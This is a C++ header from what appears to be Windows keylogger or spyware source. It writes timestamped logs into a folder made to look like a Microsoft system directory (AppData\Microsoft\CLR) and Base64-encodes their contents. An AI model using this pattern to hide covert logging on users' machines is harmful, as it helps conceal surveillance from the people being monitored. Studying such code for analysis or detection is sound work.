#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <Windows.h>
#include "Helper.h"
#include "Base64.h"

namespace IO
{
	// Function to get the path where logs or files will be stored
    // If 'append_separator' is true, adds a backslash '\' at the end of the path
	std::string GetOurPath(const bool append_separator = false) //checks if the backslash is needed at the end of our path, add if needed
	{
		std::string appdata_dir(getenv("APPDATA")); // Get the path to the user's AppData directory
		std::string full = appdata_dir + "\\Microsoft\\CLR";
		return full + (append_separator ? "\\" : "");
	}
bool MkOneDr(const std::string& path) // checks if directory already exists or not
{
    // Convert std::string to std::wstring
    std::wstring wpath(path.begin(), path.end());
    
    // Create the directory or check if it already exists
    return (bool)CreateDirectoryW(wpath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

	bool MKDir(std::string path) // builds full legal file path for each subdirectory, runs loop until a full path is created
	{
		for (char &c : path) // c takes every char of path
			if (c == '\\')
			{
				c = '\0';
				if (!MkOneDr(path))
					return false;
				c = '\\';
			}
		return true;
	}

	template <class T>
	std::string WriteLog(const T &t)
	{
		std::string path = GetOurPath(true);
		Helper::DateTime dt; // use DateTime struct from Helper namespace
		std::string name = dt.GetDateTimeString("_") + ".log";

		try
		{
			std::ofstream file(path + name);
			if (!file) return ""; // if file cannot be opened or used
			std::ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
			std::string data = Base64::EncryptB64(s.str()); // encrypt using function from Base64 namespace
			file << data;
			if (!file)
				return "";
			file.close();
			return name;
		}
		catch(...)
		{
			return "";
		}
	}
}


#endif // IO_H